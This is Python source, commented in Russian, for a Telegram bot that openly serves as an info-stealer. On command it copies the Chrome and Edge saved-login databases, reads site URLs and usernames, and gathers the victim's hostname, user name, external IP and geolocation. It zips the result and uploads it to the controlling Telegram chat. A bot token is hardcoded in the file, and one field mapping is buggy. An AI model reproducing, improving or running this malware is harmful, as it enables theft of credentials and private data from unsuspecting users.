import os
import sys
import json
import base64
import sqlite3
import shutil
import zipfile
import socket
import datetime
import requests
from telegram import Bot, Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Конфигурация
TOKEN = '8115792250:AAHYl0T-DSKf2zRrwBiqFFFU0gGx9V6-PE8'
STOLEN_DATA_DIR = "stolen_data"

def _script_dir():
    return os.path.dirname(os.path.abspath(__file__))

def _stolen_dir():
    d = os.path.join(_script_dir(), STOLEN_DATA_DIR)
    os.makedirs(d, exist_ok=True)
    return d

def steal_passwords():
    """Ворует пароли Chrome"""
    results = []
    paths = [
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
    ]
    
    for base_path in paths:
        if not os.path.exists(base_path):
            continue
            
        browser = "Chrome" if "Google" in base_path else "Edge"
        login_db = os.path.join(base_path, 'Default', 'Login Data')
        
        if os.path.exists(login_db):
            try:
                temp_db = os.path.join(_stolen_dir(), f"{browser}_login.db")
                shutil.copy2(login_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall()[:10]:  # Первые 10 паролей
                    url = row[0]
                    username = row[2]
                    if username and row[2]:
                        results.append(f"{browser}: {url} | {username} | [пароль зашифрован]")
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
    
    return results

def steal_all():
    """Собирает все данные в архив"""
    stolen_dir = _stolen_dir()
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    computer = socket.gethostname()
    
    # Отчет
    report = os.path.join(stolen_dir, f"report_{computer}_{timestamp}.txt")
    with open(report, 'w', encoding='utf-8') as f:
        f.write(f"Computer: {computer}\n")
        f.write(f"User: {os.getlogin()}\n")
        f.write(f"Time: {datetime.datetime.now()}\n\n")
        
        # Внешний IP
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
            f.write(f"IP: {ip}\n")
            
            geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
            if geo.get('status') == 'success':
                f.write(f"Location: {geo.get('country')}, {geo.get('city')}\n")
                f.write(f"ISP: {geo.get('isp')}\n")
        except:
            pass
        
        f.write("\n" + "="*50 + "\n")
        f.write("PASSWORDS:\n")
        
        passwords = steal_passwords()
        for p in passwords:
            f.write(p + "\n")
    
    # Архив
    archive = os.path.join(stolen_dir, f"stolen_{computer}_{timestamp}.zip")
    with zipfile.ZipFile(archive, 'w') as zipf:
        zipf.write(report, os.path.basename(report))
    
    os.remove(report)
    return archive

async def steal_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда кражи"""
    await update.message.reply_text("🕵️ Собираю данные...")
    try:
        archive = steal_all()
        if os.path.exists(archive):
            with open(archive, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    caption=f"📦 Stolen data - {socket.gethostname()}"
                )
            os.remove(archive)
        else:
            await update.message.reply_text("❌ Данные не собраны")
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🕵️ УКРАСТЬ ДАННЫЕ")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("Бот готов", reply_markup=reply_markup)

def main():
    print("Бот запускается...")
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex("🕵️ УКРАСТЬ ДАННЫЕ"), steal_command))
    print("Бот работает!")
    app.run_polling()

if __name__ == '__main__':
    main()